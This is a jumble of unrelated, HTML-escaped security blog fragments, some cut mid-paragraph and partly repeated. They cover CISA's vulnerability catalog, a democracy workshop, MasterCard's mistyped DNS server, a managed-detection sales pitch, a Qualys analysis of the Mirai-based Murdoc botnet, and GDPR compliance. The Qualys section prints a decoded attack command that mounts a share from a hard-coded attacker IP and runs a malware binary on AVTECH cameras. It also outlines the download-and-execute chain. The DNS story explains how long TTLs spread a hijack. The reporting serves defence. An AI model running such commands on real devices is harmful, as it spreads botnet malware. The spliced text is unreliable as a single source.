&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice.

This is a small, invitational workshop on the future of democracy. As with the &lt;a href="https://www.schneier.com/iword/2022/"&gt;previous&lt;/a&gt; &lt;a href="https://www.schneier.com/iword/2023/"&gt;two&lt;/a&gt; workshops, the goal was to bring together a diverse set of political scientists, law professors, philosophers, AI researchers and other industry practitioners, political activists, and creative types (including science fiction writers) to discuss how democracy might be reimagined in the current century.&lt;/p&gt;
&lt;p&gt;The goal of the workshop is to think very broadly. Modern democracy was invented in the mid-eighteenth century, using mid-eighteenth-century technology. If democracy were to be invented today, it would look very different. Elections would look different. The balance between representation and direct democracy would look different. Adjudication and enforcement would look different. Everything would look different, because our conceptions of fairness, justice, equality, and rights are different, and we have much more powerful technology to bring to bear on the problems. Also, we could start from scratch without having to worry about evolving our current democracy into this imagined future system.&lt;/p&gt;
&lt;p&gt;We can&amp;#8217;t do that, of course, but it&amp;#8217;s still still valuable to speculate. Of course we need to figure out how to reform our current systems, but we shouldn&amp;#8217;t limit our thinking to incremental steps. We also need to think about discontinuous changes as well. I wrote about the philosophy more in this &lt;a href="https://theconversation.com/re-imagining-democracy-for-the-21st-century-possibly-without-the-trappings-of-the-18th-century-210586"&gt;essay&lt;/a&gt; about IWORD 2022.&lt;/p&gt;
&lt;p&gt;IWORD 2024 was easily the most intellectually stimulating two days of my year. It&amp;#8217;s also intellectually exhausting; the speed and intensity of ideas is almost too much. I wrote the format in my &lt;a href="https://www.schneier.com/blog/archives/2024/01/second-interdisciplinary-workshop-on-reimagining-democracy.html"&gt;blog post&lt;/a&gt; on IWORD 2023.&lt;/p&gt;

&lt;/ul&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;

BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice.

&lt;p&gt;From June 30, 2020 until January 14, 2025, one of the core Internet servers that MasterCard uses to direct traffic for portions of the mastercard.com network was misnamed. MasterCard.com relies on five shared Domain Name System (DNS) servers at the Internet infrastructure provider &lt;strong&gt;Akamai &lt;/strong&gt;[DNS acts as a kind of Internet phone book, by translating website names to numeric Internet addresses that are easier for computers to manage].&lt;/p&gt;
&lt;p&gt;All of the Akamai DNS server names that MasterCard uses are supposed to end in &amp;#8220;akam.net&amp;#8221; but one of them was misconfigured to rely on the domain &amp;#8220;&lt;strong&gt;akam.ne&lt;/strong&gt;.&amp;#8221;&lt;/p&gt;
&lt;p&gt;This tiny but potentially critical typo was discovered recently by &lt;strong&gt;Philippe Caturegli&lt;/strong&gt;, founder of the security consultancy &lt;a href="https://www.seralys.com/" rel="noopener" target="_blank"&gt;Seralys&lt;/a&gt;. Caturegli said he guessed that nobody had yet registered the domain akam.ne, which is under the purview of the top-level domain authority for the West Africa nation of &lt;a href="https://en.wikipedia.org/wiki/Niger" rel="noopener" target="_blank"&gt;Niger&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Caturegli said it took $300 and nearly three months of waiting to secure the domain with the registry in Niger. After enabling a DNS server on akam.ne, he noticed hundreds of thousands of DNS requests hitting his server each day from locations around the globe. Apparently, MasterCard wasn&amp;#8217;t the only organization that had fat-fingered a DNS entry to include &amp;#8220;akam.ne,&amp;#8221; but they were by far the largest.&lt;/p&gt;
&lt;p&gt;Had he enabled an email server on his new domain akam.ne, Caturegli likely would have received wayward emails directed toward mastercard.com or other affected domains. If he&amp;#8217;d abused his access, he probably could have &lt;a href="https://krebsonsecurity.com/2024/08/local-networks-go-global-when-domain-names-collide/" rel="noopener" target="_blank"&gt;obtained website encryption certificates (SSL/TLS certs)&lt;/a&gt; that were authorized to accept and relay web traffic for affected websites. He may even have been able to &lt;a href="https://krebsonsecurity.com/2020/02/dangerous-domain-corp-com-goes-up-for-sale/" rel="noopener" target="_blank"&gt;passively receive Microsoft Windows authentication credentials&lt;/a&gt; from employee computers at affected companies.&lt;/p&gt;
&lt;p&gt;But the researcher said he didn&amp;#8217;t attempt to do any of that. Instead, he alerted MasterCard that the domain was theirs if they wanted it, copying this author on his notifications. A few hours later, MasterCard acknowledged the mistake, but said there was never any real threat to the security of its operations.&lt;/p&gt;
&lt;p&gt;&amp;#8220;We have looked into the matter and there was not a risk to our systems,&amp;#8221; a MasterCard spokesperson wrote. &amp;#8220;This typo has now been corrected.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Meanwhile, Caturegli received a request submitted through &lt;strong&gt;Bugcrowd&lt;/strong&gt;, a program that offers financial rewards and recognition to security researchers who find flaws and work privately with the affected vendor to fix them. The message suggested his public disclosure of the MasterCard DNS error via &lt;a href="https://www.linkedin.com/feed/update/urn:li:activity:7285038365236682753/" rel="noopener" target="_blank"&gt;a post on LinkedIn&lt;/a&gt; (after he&amp;#8217;d secured the akam.ne domain) was not aligned with ethical security practices, and passed on a request from MasterCard to have the post removed.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70126" style="width: 718px;"&gt;&lt;img alt="" class="size-full wp-image-70126" height="855" src="https://krebsonsecurity.com/wp-content/uploads/2025/01/mastercard-response.png" width="708" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70126"&gt;MasterCard&amp;#8217;s request to Caturegli, a.k.a. &amp;#8220;Titon&amp;#8221; on infosec.exchange.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Caturegli said while he does have an account on Bugcrowd, he has never submitted anything through the Bugcrowd program, and that he reported this issue directly to MasterCard.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I did not disclose this issue through Bugcrowd,&amp;#8221; Caturegli wrote in reply. &amp;#8220;Before making any public disclosure, I ensured that the affected domain was registered to prevent exploitation, mitigating any risk to MasterCard or its customers. This action, which we took at our own expense, demonstrates our commitment to ethical security practices and responsible disclosure.&amp;#8221; &lt;span id="more-70117"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Most organizations have at least two authoritative domain name servers, but some handle so many DNS requests that they need to spread the load over additional DNS server domains. In MasterCard&amp;#8217;s case, that number is five, so it stands to reason that if an attacker managed to seize control over just one of those domains they would only be able to see about one-fifth of the overall DNS requests coming in.&lt;/p&gt;
&lt;p&gt;But Caturegli said the reality is that many Internet users are relying at least to some degree on public traffic forwarders or DNS resolvers like &lt;strong&gt;Cloudflare&lt;/strong&gt; and &lt;strong&gt;Google&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&amp;#8220;So all we need is for one of these resolvers to query our name server and cache the result,&amp;#8221; Caturegli said. By setting their DNS server records with a long TTL or &amp;#8220;Time To Live&amp;#8221; &amp;#8212; a setting that can adjust the lifespan of data packets on a network &amp;#8212; an attacker&amp;#8217;s poisoned instructions for the target domain can be propagated by large cloud providers.&lt;/p&gt;
&lt;p&gt;&amp;#8220;With a long TTL, we may reroute a LOT more than just 1/5 of the traffic,&amp;#8221; he said.&lt;/p&gt;
&lt;p&gt;The researcher said he&amp;#8217;d hoped that the credit card giant might thank him, or at least offer to cover the cost of buying the domain.&lt;/p&gt;
&lt;p&gt;&amp;#8220;We obviously disagree with this assessment,&amp;#8221; Caturegli wrote in &lt;a href="https://www.linkedin.com/feed/update/urn:li:activity:7285038365236682753?commentUrn=urn%3Ali%3Acomment%3A%28activity%3A7285038365236682753%2C7285289297706909697%29&amp;amp;dashCommentUrn=urn%3Ali%3Afsd_comment%3A%287285289297706909697%2Curn%3Ali%3Aactivity%3A7285038365236682753%29" rel="noopener" target="_blank"&gt;a follow-up post&lt;/a&gt; on LinkedIn regarding MasterCard&amp;#8217;s public statement. &amp;#8220;But we’ll let you judge— here are some of the DNS lookups we recorded before reporting the issue.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70125" style="width: 800px;"&gt;&lt;img alt="" class="size-full wp-image-70125" height="561" src="https://krebsonsecurity.com/wp-content/uploads/2025/01/mastercard-domains.png" width="790" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70125"&gt;Caturegli posted this screenshot of MasterCard domains that were potentially at risk from the misconfigured domain.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;As the screenshot above shows, the misconfigured DNS server Caturegli found involved the MasterCard subdomain &lt;strong&gt;az.mastercard.com&lt;/strong&gt;. It is not clear exactly how this subdomain is used by MasterCard, however their naming conventions suggest the domains correspond to production servers at Microsoft&amp;#8217;s &lt;strong&gt;Azure&lt;/strong&gt; cloud service. Caturegli said the domains all resolve to Internet addresses at Microsoft.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Don’t be like Mastercard,&amp;#8221; Caturegli concluded in his LinkedIn post. &amp;#8220;Don’t dismiss risk, and don’t let your marketing team handle security disclosures.&amp;#8221;&lt;/p&gt;
&lt;p&gt;One final note: The domain akam.ne has been registered previously &amp;#8212; in December 2016 by someone using the email address um-i-delo@yandex.ru. The Russian search giant Yandex reports this user account belongs to an &amp;#8220;Ivan I.&amp;#8221; from Moscow. Passive DNS records from &lt;a href="https://www.domaintools.com" rel="noopener" target="_blank"&gt;DomainTools.com&lt;/a&gt; show that between 2016 and 2018 the domain was connected to an Internet server in Germany, and that the domain was left to expire in 2018.&lt;/p&gt;

For managed service providers (MSPs) supporting small and medium-sized businesses (SMBs) with cybersecurity services, staying ahead of these adversaries is crucial. One of the most effective ways to do so is through round-the-clock threat hunting.&lt;/p&gt;



&lt;p&gt;In this blog, we&amp;#8217;ll explore why constant threat hunting is essential, the challenges MSPs face in providing it, and how OpenText MDR can help overcome these challenges while offering SMBs the protection they need.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;The critical edge of 24/7 threat hunting&lt;/h2&gt;



&lt;p&gt;The pace of cyberattacks has never been faster. Modern threat actors are well-organized and highly skilled, using a range of attack methods to infiltrate systems, escalate privileges, and exfiltrate valuable data. The days of simplistic attacks that can be thwarted by basic defenses are long gone. Today’s adversaries employ advanced tactics like cross-domain attacks, use of stolen credentials, and sophisticated social engineering campaigns to infiltrate systems.&lt;/p&gt;



&lt;p&gt;In addition to their increasing sophistication, adversaries are also incredibly fast. Breakout time, the window of time it takes for an attacker to gain initial access and the point at which they can move laterally to other critical systems, can be measured in minutes.&lt;/p&gt;



&lt;p&gt;Given this reality, each minute lost in detection can give attackers the critical time they need to entrench themselves deeper within the organization’s environment. That’s why faster detection and response times are essential, delaying the response only increases the damage. That&amp;#8217;s where 24/7 threat hunting becomes indispensable for MSPs looking to stay one step ahead of cybercriminals and protect their SMB customers.&lt;/p&gt;



&lt;p&gt;Proactive threat hunting is the key to proactively identifying suspicious activity. It’s not just about waiting for an alert; it&amp;#8217;s about actively searching for hidden threats in real-time. Threat hunting involves a combination of human expertise and advanced technologies that continuously analyze system data, identifying suspicious patterns or behaviors. By leveraging threat intelligence, threat hunters can spot emerging tactics, techniques, and procedures (TTPs) used by adversaries, often before they&amp;#8217;re seen in traditional threat intelligence feeds.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;The challenge of building 24/7 threat hunting&lt;br /&gt;in-house&lt;/h2&gt;



&lt;p&gt;While 24/7 threat hunting is undeniably essential for protecting SMBs, building and delivering this capability in-house presents significant challenges for many MSPs. Providing round-the-clock monitoring and expert threat hunting requires not only advanced technology but also skilled cybersecurity professionals—resources that can be costly, complex to manage, and hard to scale. Here are some of the main challenges MSPs face when trying to provide 24/7 threat hunting:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;High financial investment&lt;/strong&gt;&lt;br /&gt;A fully staffed threat hunting team with a security operations center (SOC) requires significant financial investment. In-house teams need to be equipped with advanced security tools, threat intelligence, and continuous training.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Complexity of management&lt;/strong&gt;&lt;br /&gt;Threat hunting is not a simple task. It involves gathering and analyzing vast amounts of data from a range of endpoints, networks, and cloud to identify and track suspicious activity. With the growing number of tools and services available, managing these resources can quickly become overwhelming. MSPs may lack the expertise to tie everything together or the time to continuously monitor and analyze threat hunting data.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Resources&lt;/strong&gt;&lt;br /&gt;Maintaining 24/7 monitoring requires ongoing staffing, training, and operational management, which can stretch MSP resources thin. It’s hard to find skilled professionals who can perform threat hunting and respond to incidents in real-time. Cybersecurity talent is in high demand, and the shortage of skilled security experts makes it even more difficult for MSPs to maintain a robust in-house security operation.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Given these challenges, how can MSPs continue to provide best-in-class security services to their SMB customers? The answer lies in outsourcing to a fully managed solution that offers 24/7 threat hunting without the need for large internal teams or heavy financial investment.&lt;/p&gt;



&lt;p&gt;That’s where OpenText MDR comes in.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;OpenText MDR: The MSP solution for 24/7 threat hunting&lt;/h2&gt;



&lt;p&gt;For MSPs looking to provide round-the-clock threat hunting without the overhead of building an in-house solution, OpenText MDR offers a fully managed detection and response service that provides continuous monitoring, expert threat hunting, and rapid incident response—backed by a 24/7/365 SOC.&lt;/p&gt;



&lt;p&gt;Here’s how OpenText MDR addresses the challenges MSPs face:&lt;/p&gt;

&lt;p&gt;In this latest campaign we note the utilization of ELF file and Shell Script execution, which leads to the deployment of the botnet sample. This technique was already seen in 2024 when the attackers exploited the same vulnerabilities to load their malware payload on the targeted devices.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image1.png"&gt;&lt;img alt="" class="wp-image-37109" height="407" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image1.png" width="1429" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1: Attack timeline&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;The diagram above conveys the percentage of increased and decreased attacks per month relative to the previous month.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="technical-campaign-analysis"&gt;Technical campaign analysis&lt;/h2&gt;



&lt;p&gt;During routine hunting analysis, the Qualys Threat Research team uncovered evidence of an ongoing live campaign for Mirai, which commenced in July 2024.&lt;/p&gt;



&lt;p&gt;With the help of the below FOFA query, we discovered that around 1300+ IPs were &amp;nbsp;found active on this campaign.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image2.png"&gt;&lt;img alt="" class="wp-image-37110" height="1045" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image2.png" width="1429" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2: FOFA Query&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="command-and-control-analysis"&gt;Command-and-control analysis&lt;/h2&gt;



&lt;p&gt;The Qualys Threat Research Team uncovered the presence of 100+ distinct sets of servers, each tasked with deciphering its activities and establishing communication with one of the compromised IPs implicated in this ongoing campaign. These servers facilitated the distribution of Mirai malware.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image3.png"&gt;&lt;img alt="" class="wp-image-37111" height="798" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image3.png" width="1410" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3: Embedded payloads&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;The above-mentioned figure shows the complete details of identified command-and-control servers, with respective payload content to the final URL, which drops the Mirai malware.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="murdoc-botnet"&gt;Murdoc Botnet&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/h2&gt;



&lt;p&gt;Mirai malware, here dubbed as Murdoc Botnet, is a prominent malware family for *nix systems. It mainly targets vulnerable AVTECH and Huawei devices. This botnet also uses some existing exploits (&lt;a href="https://github.com/R00tS3c/DDOS-RootSec/blob/master/Botnets/Exploits/avtech.py"&gt;CVE-2024-7029&lt;/a&gt;, &lt;a href="https://www.exploit-db.com/exploits/43414"&gt;CVE-2017-17215&lt;/a&gt;) to download the next-stage payloads.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image4.png"&gt;&lt;img alt="" class="wp-image-37112" height="297" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image4.png" width="707" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4: Huawei Exploit inside binary (CVE-2017-17215)&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-37113" height="799" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image5.png" width="826" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5: Embedding Payloads by exploiting CVE-2024-7029&lt;/figcaption&gt;&lt;/figure&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-37114" height="582" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image6.png" width="826" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6: Base64 encoded commands&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;&lt;/p&gt;



&lt;p&gt;The decoded base64 encoded payload is:&lt;/p&gt;



&lt;p&gt;cd /tmp; mkdir skid; mount -o intr,nolock,tcp,exec 45.148.121.58:/root/static skid; cd skid; ./meow.arm5 avtech;&lt;/p&gt;



&lt;p&gt;The payload indicates that it is targeting AVTECH cameras.&lt;/p&gt;



&lt;p&gt;In Figures 4 and Figure 5, we can see the embedded command line injection for the AVTECH camera, by which the malware binary:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Using the wget/ftpget command, fetches the shellscript file.&lt;/li&gt;



&lt;li&gt;Executes it and removes it.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;We discovered 500+ samples containing ELF files and ShellScript files. Each ShellScript is loaded onto devices such as IP cameras, Network devices, and IoT devices, and, in turn, the C2 server loads the new variant of Mirai botnet, i.e., Murdoc Botnet, into the devices. We have analyzed several samples; all use the same mechanism as the infection flow.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="in-depth-shell-script-analysis"&gt;In-depth shell script analysis:&lt;/h2&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image7.png"&gt;&lt;img alt="" class="wp-image-37115" height="456" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image7.png" width="1360" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7: Bash Script&lt;/figcaption&gt;&lt;/figure&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image8.png"&gt;&lt;img alt="" class="wp-image-37116" height="804" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image8.png" width="1365" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8: Bash scripts indicate that the sample is targeting TPLINK&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;/p&gt;



&lt;p&gt;Typically, as mentioned in the figures above, the malware shell script uses GTFOBins and does the following:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Using wget command, fetches the payload.&lt;/li&gt;



&lt;li&gt;Gives the execution permission to the payload using the chmod command.&lt;/li&gt;



&lt;li&gt;Executes the payload.&lt;/li&gt;



&lt;li&gt;Removes the payload.&lt;/li&gt;
&lt;/ul&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37117" height="314" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image9-1070x314.png" width="1070" /&gt;&lt;/figure&gt;

&lt;h2 class="wp-block-heading" id="affected-countries"&gt;&lt;strong&gt;Affected Countries&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Upon a thorough examination of the IP addresses associated with the campaign activity, the Qualys Threat Research Team unveiled the geographical distribution of affected countries, with Malaysia occupying the foremost position, followed by Thailand, Mexico, and Indonesia.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image10.png"&gt;&lt;img alt="" class="wp-image-37118" height="899" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image10.png" width="1431" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10: Affected Countries&lt;/figcaption&gt;&lt;/figure&gt;

&lt;h2 class="wp-block-heading" id="conclusion-recommended-steps-to-protect-against-the-variant"&gt;Conclusion &amp;amp; Recommended Steps to Protect Against the Variant&lt;/h2&gt;



&lt;p&gt;Our research initially started with the discovery and analysis of Murdoc Botnet binaries used for DDOS activities. Using Qualys EDR, threat intelligence data, and open-source intelligence (OSINT), we were able to attribute Murdoc Botnet as a Mirai variant.&lt;/p&gt;



&lt;p&gt;We recommend the following measures for enterprise users and administrators to identify and protect against such attacks:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Regularly monitor the suspicious processes, events, and network traffic spawned by the execution of any untrusted binary/scripts.&lt;/li&gt;



&lt;li&gt;Always be cautious in executing shell scripts from unknown or untrusted sources.&lt;/li&gt;



&lt;li&gt;Keep systems and firmware updated with the latest releases and patches.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="iocs"&gt;IOCs&lt;/h2&gt;



&lt;p&gt;We have found 300+ x86 samples and 40+ x86_64 samples. Below are a few for your reference.&lt;/p&gt;

We recognise the visible and consumer-facing aspects of the General Data Protection Regulation in our everyday lives – when consumers exercise their right to withdraw consent to their data being processed via ‘opt out’ or ‘unsubscribe’ buttons, for example. What’s less evident is whether organisations are keeping their practices fully up to date and in line with the GDPR and other applicable data protection laws. For instance: So, how sure are you that your organisation is fully compliant with the relevant data protection legislation? In this blog ‘Once compliant’ does not mean ‘still compliant’ &lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/what-it-takes-to-be-your-organisations-dpo-or-data-privacy-lead"&gt;What It Takes to Be Your Organisation’s DPO or Data Privacy Lead&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance UK Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;‘GDPR’ has become a familiar term.&lt;/p&gt;



&lt;p&gt;We recognise the visible and consumer-facing aspects of the &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;General Data Protection Regulation&lt;/a&gt; in our everyday lives – when consumers exercise their right to withdraw consent to their data being processed via ‘opt out’ or ‘unsubscribe’ buttons, for example.&lt;/p&gt;



&lt;p&gt;What’s less evident is whether organisations are keeping their practices fully up to date and in line with the GDPR and other applicable data protection laws. For instance:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Since adding unsubscribe buttons, those same organisations may have purchased marketing email lists without confirming the &lt;a href="https://www.itgovernance.co.uk/blog/how-organisations-are-failing-to-process-personal-data-lawfully-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;lawful basis&lt;/a&gt; under which the personal data was collected and sold.&lt;/li&gt;



&lt;li&gt;Where the organisation has bought a marketing list, did it screen that list against its list of people who have previously opted out, so that it removes those individuals from the purchased list before starting to market to them?&lt;/li&gt;



&lt;li&gt;Since the EU GDPR was adopted in 2016 and became enforceable from 2018, we’ve had the &lt;a href="https://www.itgovernance.co.uk/dpa-2018" rel="noreferrer noopener" target="_blank"&gt;DPA (Data Protection Act) 2018&lt;/a&gt; and Brexit in the UK.&lt;/li&gt;



&lt;li&gt;More than 20 articles have been withdrawn from the EU GDPR to make the UK GDPR, and the DPA 2018 has been amended to be read in conjunction with the UK GDPR.&lt;/li&gt;
&lt;/ul&gt;







&lt;p&gt;So, how sure are you that your organisation is fully compliant with the relevant data protection legislation?&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="Once-compliant-does-not-mean-still-compliant"&gt;‘Once compliant’ does not mean ‘still compliant’&lt;/h2&gt;



&lt;p&gt;If you’re anything less than 100% sure, there’s a fair chance that someone, somewhere, has assumed that nothing has changed internally or within the law.&lt;/p&gt;



&lt;p&gt;Just because you sought expert opinion on the matter a few years ago doesn’t mean you’re in the clear. ‘Once compliant’ doesn’t mean ‘still compliant’.&lt;/p&gt;



&lt;p&gt;Previous decisions made – like not having to appoint a &lt;a href="https://www.itgovernance.co.uk/data-protection-officer-dpo-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;DPO (data protection officer)&lt;/a&gt;, or not needing to conduct a &lt;a href="https://www.itgovernance.co.uk/privacy-impact-assessment-pia" rel="noreferrer noopener" target="_blank"&gt;DPIA (data protection impact assessment)&lt;/a&gt; – need to be kept under review.&lt;/p&gt;



&lt;p&gt;Circumstances can change, as can guidance from the ICO (Information Commissioner’s Office), EDPB (European Data Protection Board), and similar bodies. Organisations should make someone responsible for monitoring such changes.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Data-protection-is-international"&gt;Data protection is international&lt;/h2&gt;



&lt;p&gt;The EU GDPR, UK GDPR and DPA 2018 aren’t the only laws you may need to comply with.&lt;/p&gt;



&lt;p&gt;Data protection laws exist in almost every country and are relevant wherever you do business. You can design your systems and processes such that they meet all these legal requirements. A management system like an &lt;a href="https://www.itgovernance.co.uk/iso27001" rel="noreferrer noopener" target="_blank"&gt;ISO 27001 ISMS&lt;/a&gt; or an &lt;a href="https://www.itgovernance.co.uk/iso-27701" rel="noreferrer noopener" target="_blank"&gt;ISO 27701 PIMS&lt;/a&gt; can significantly help with this.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;But compliance requires clarity.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If you don’t understand the topics in detail, you risk conflating one standard or regulation with another, causing you to lose out on multiple fronts.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;Conflicting laws&lt;/h3&gt;



&lt;p&gt;You’ll see few conflicts in Europe, as the EU GDPR was designed to integrate with EU laws. And post-Brexit, differences in UK and EU data protection law have remained small (though not non-existent, as discussed earlier).&lt;/p&gt;



&lt;p&gt;But the further afield you go, the more problems you might run into. I experienced this when doing some GDPR work for a large Saudi Arabian organisation – a national law prevented it from being allowed to report data breaches with a risk to data subjects outside the country. And where laws compete, the strictest law always applies.&lt;/p&gt;



&lt;p&gt;DPOs and data privacy leads need to know how to deal with situations like that. They’ll have to find a workaround like publishing a statement on the website along the lines of: ‘Please be aware that you might want to change your password at your earliest opportunity.’&lt;/p&gt;



&lt;p&gt;Being able to clearly distinguish one regulation from another to unpick any problems is a key skill for a DPO.&lt;/p&gt;

&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



